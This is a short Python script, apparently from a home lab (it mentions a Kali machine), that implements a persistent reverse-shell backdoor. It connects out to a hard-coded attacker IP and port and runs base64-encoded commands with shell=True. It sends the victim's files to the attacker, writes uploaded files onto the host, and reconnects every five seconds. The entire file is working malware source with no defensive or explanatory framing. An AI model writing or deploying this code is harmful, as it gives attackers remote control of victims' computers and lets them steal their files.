import socket
import subprocess
import os
import base64
import time

# --- Configuration ---
ATTACKER_IP = '192.168.109.129' # Prüfe deine Kali IP!
PORT = 7007
BUFFER_SIZE = 8192

def connect():
    while True: # Outer loop for reconnection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, PORT))
            
            while True: # Inner loop for communication
                data = s.recv(BUFFER_SIZE)
                if not data: break
                
                # STEP 4: DECRYPTION (Base64)
                cmd = base64.b64decode(data).decode()
                if cmd.lower() == "exit": break
                
                # --- STEP 3: SEND FILES (Download from Windows to Kali) ---
                if cmd.startswith("download"):
                    file_path = cmd.split(" ", 1)[1]
                    # Check with or without .txt extension
                    if not os.path.exists(file_path) and os.path.exists(file_path + ".txt"):
                        file_path += ".txt"
                    
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            s.send(f.read())
                    else:
                        s.send(f"ERROR: File {file_path} not found.".encode())

                # --- NEW: RECEIVE FILES (Upload from Kali to Windows) ---
                elif cmd.startswith("upload"):
                    file_name = cmd.split(" ", 1)[1]
                    s.send(b"READY_TO_RECEIVE")
                    file_content = s.recv(1024 * 1024) # 1MB Buffer for upload
                    with open(file_name, "wb") as f:
                        f.write(file_content)
                    s.send(f"[*] File {file_name} successfully uploaded.".encode())

                # --- STEP 4: REMOTE CONTROL (Execute Commands) ---
                else:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    out, err = proc.communicate()
                    s.send(out + err if (out + err) else b"Done.")
            
            s.close()
        except Exception:
            # Wait 5 seconds before trying to reconnect
            time.sleep(5)

if __name__ == "__main__":
    connect()